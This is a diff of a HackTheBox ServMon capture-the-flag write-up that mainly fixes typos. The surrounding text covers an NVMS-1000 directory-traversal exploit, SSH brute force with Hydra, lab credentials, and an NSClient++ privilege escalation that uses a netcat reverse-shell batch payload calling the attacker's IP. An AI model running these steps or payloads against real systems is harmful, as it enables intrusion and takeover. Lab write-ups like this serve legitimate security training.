@@ -9,7 +9,7 @@ summary: HackTheBox ServMon Writeup
 ---
 
 ## Brief
-&nbsp; &nbsp; On enumerating different services of `ServMon` machine, we were able to find few confidentails files from `FTP` service which discloses a hint saying that list of password is stored in `Nathan` uers desktop. On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. `NVMS-1000`. On assessing the software, it was vulnerable to `Directory Traversal` vulnerability which helps us to conquer the `Passwords.txt` from `Nathan's` desktop by using exploit available on exploit-db. On this point we have got a list of passsword and two usersname ( `Nathan` and `Nadine` ), we try to brute force the available `SSH` service on target machine using `Hydra`. On the conclusion of brute forcing, we were able to find credentails of `nadine` and taking leverage of it, we ssh to the machine using `nadine` cracked password and get `proof.txt`. Once we got the local access, enumeration helped us to find `NSClient++` running and on expxloitation of it using publicly available script, we were able to get maximum level of privelege and get `root.txt`.
+&nbsp; &nbsp; On enumerating different services of `ServMon` machine, we were able to find few confidentail files from `FTP` service which disclosed a hint saying that a file consisting of passwords being stored in `Nathan` users desktop. On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. `NVMS-1000`. Assessing the software, it was vulnerable to `Directory Traversal` vulnerability which helped us to conquer the `Passwords.txt` from `Nathan's` desktop by using exploit available on exploit-db.As we have got a list of passsword and two usersnames ( `Nathan` and `Nadine` ), we try to brute force the available `SSH` service on target machine using `Hydra`. Brute Forcing helped us to find credentails of `nadine` and taking leverage of it, we ssh'ed to the machine using `nadine` cracked password and get `user.txt`. Once we got the local access, enumeration helped us to find `NSClient++` running and on exploitation of it using publicly available script, we were able to get maximum level of privelege and get `root.txt`.
 
 
 &nbsp;
@@ -21,11 +21,11 @@ summary: HackTheBox ServMon Writeup
 
 - Brute force `SSH` service using two usernames `Nathan` and `Nadine` against `Passwords.txt` using `hydra`
 
-- Login as `nadine` with credentials found via `hydra` ( `nadine:L1k3B1gBut7s@W0rk` )
+- Login as `nadine` on `SSH` service with credentials found via `hydra` ( `nadine:L1k3B1gBut7s@W0rk` )
 
 - Get `user.txt`
 
-- Local enumeramation discloses usage of `NSClient++` and also `nmap` ( **8443** )report discloses the same in target machine
+- Local enumeration discloses usage of `NSClient++` and also `nmap` ( **8443** ) report discloses the same in target machine
 
 - Search for `NSClient ++` leads to publicly available writeup ( `exploit-db` ) to escalate the privilege.
 
@@ -192,7 +192,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ### 1.2 || FTP
 
-Nmap result shows us that it has `FTP` service running and on detecting `Anonymous FTP`, we were able to get FTP access of the machine. `Anonymous FTP` reveals a file named `Confidential.txt` which gives us hint of a `Passwors.txt` file being stored in `Nathane's` Desktop.
+Nmap result shows us that it has `FTP` service running and on detecting `Anonymous FTP`, we were able to get FTP access of the machine. `Anonymous FTP` reveals a file named `Confidential.txt` which gives us hint of a `Passwords.txt` file being stored in `Nathane's` Desktop.
 
 -> `FTP access`
 
@@ -212,14 +212,14 @@ $ ftp 10.10.10.184
 
 ### 1.3 || NVMS-1000 (Port 80)
 
-On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. `NVMS-1000`. Exploit-Db suggests an exploit of `NVMS-1000` being vulnerable to Directory Traversal attack.
+On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. `NVMS-1000`. Exploit-db suggests an exploit of `NVMS-1000` being vulnerable to `Directory Traversal` attack.
 
 **POC**: [https://www.expxloit-db.com/exploits/48311](https://www.expxloit-db.com/exploits/48311)
 
 
 ![deploy using travis](/assets/img/posts/HTB/ServMon/4.png){:class="img-fluid"}  
 
-Executing the script by providing proper paarameters as shown in below picture results in access of `Passwords.txt` from `Nathan's` desktop.
+Executing the script by providing proper parameters as shown in below picture results in access of `Passwords.txt` from `Nathan's` desktop.
 
 ```yml
 $ python 48311.py http://10.10.10.184/ /Users/Nathan/Desktop/Passwords.txt passwords_list.txt
@@ -262,14 +262,14 @@ $ ssh 10.10.10.184
 
 ### 3.1 || Enumerate local system
 
-Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses `NSClient ++`. This service was also discover via nmap output ( `8443` .)
+Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses `NSClient ++`. This service was also discovered via nmap output ( `8443` .)
 
 **Port 8443**
 
 ![deploy using travis](/assets/img/posts/HTB/ServMon/9.png){:class="img-fluid"}  
 
 
-On searching for exploits with respect to `NSClient ++`, we were able to find a wtiteup on exploit-db to escalte the privilege by exploiting `NSClient ++` exploit.
+On searching for exploits with respect to `NSClient ++`, we were able to find a writeup on exploit-db to escalte the privilege by exploiting `NSClient ++` vulenrability.
 
 **NSClient ++ writeup on exploit-db**: [https://www.expxloit-db.com/exploits/46802](https://www.expxloit-db.com/exploits/46802)
 
@@ -298,7 +298,7 @@ On checking the configuration file ( `nsclient.ini` ), `CheckExternalScript` & `
 
 -> `Step 3: Create Payload`
 
-As per the exploit poc, we are supposed to create a `.bat` consisting of the below payload and add as an external script to `NSClient++`.
+As per the exploit poc, we are supposed to create a `.bat` consisting of the below payload and add as an external script to `NSClient++` service.
 
 ```yml
 @echo off
@@ -306,7 +306,7 @@ C:\temp\nc.exe 10.10.15.137 443 -e cmd.exe
 ```
 where,
 
-&nbsp; &nbsp; **10.10.15.137**: Listening HOST ( Attacking machine's IP address)
+&nbsp; &nbsp; **10.10.15.137**: Listening Host ( Attacking machine's IP address)
 
 &nbsp; &nbsp; **443**: Listening Port ( Attacking machine's listening port)
 
@@ -319,9 +319,9 @@ $ echo C:\Temp\nc.exe 10.10.15.137 443 -e cmd.exe >> evilish.bat
 ```
 ![deploy using travis](/assets/img/posts/HTB/ServMon/14.png){:class="img-fluid"}  
 
-Adding an external script can be acheived by logging in via the web portal availble on port `8443`. However, for some strange reason, the web portal seemt to be very unstable and hence, we'll be following `API` available in documentation of [NSClient_++]() via using curl commands locally.
+Adding an external script can be acheived by logging in via the web portal availble on port `8443`. However, for some strange reason, the web portal seemt to be very unstable and hence, we'll be using `API` available in documentation of [NSClient_++]() via using curl commands locally.
 
-Under the `Scripts` section API documentation, we were able to discover a method to add an external script via command line. 
+Under the `Scripts` section of API documentation, we were able to discover a method to add an external script via command line. 
 
 ![deploy using travis](/assets/img/posts/HTB/ServMon/15.png){:class="img-fluid"}  
 
@@ -332,7 +332,7 @@ curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/che
 ```
 ![deploy using travis](/assets/img/posts/HTB/ServMon/16.png){:class="img-fluid"}  
 
-On using the above command, it prompts for a password. The password to be used is password discover in `Step 1` ( `ew2x6SsGTxjRwXOT` )
+On using the above command, it prompts for a password. The password to be used is password discovered in **Step 1** ( `ew2x6SsGTxjRwXOT` )
 
 -> `Step 4: Download nc.exe to target machine`
 
@@ -370,7 +370,7 @@ $ curl -s -k -u admin https://1ocalhost:8443/api/v1/queries/check_new/commands/e
 
 ### 3.2 || Privileged Shell
 
-Before performing `Step 5` from the previous section, we need to create a listener at out attacking machine. Below is the command to listening for getting a reverse shell:
+Before performing `Step 5` from the previous section, we need to create a listener at our attacking machine. Below is the command used to use for getting a reverse shell:
 
 ```yml
 $ nc -lvnp 443
@@ -391,6 +391,6 @@ Once the listener is set, we can execute the payload and get a reverse shell wit
 
 As the main motto to build HackTheBox platform for security researchers is to help us hone our testing skills and hence, every machine has its key takeways.
 
-For me, the key takeways was services discovered via nmap also runs on localhost in the target machine. As explained above, `NSClient++` web portal was unstable and hence, we had to attack via command line against localhost.
+For me, the key takeway was services discovered via nmap also runs on localhost in the target machine. As explained above, `NSClient++` web portal was unstable and hence, we had to attack via command line against localhost.
 
 
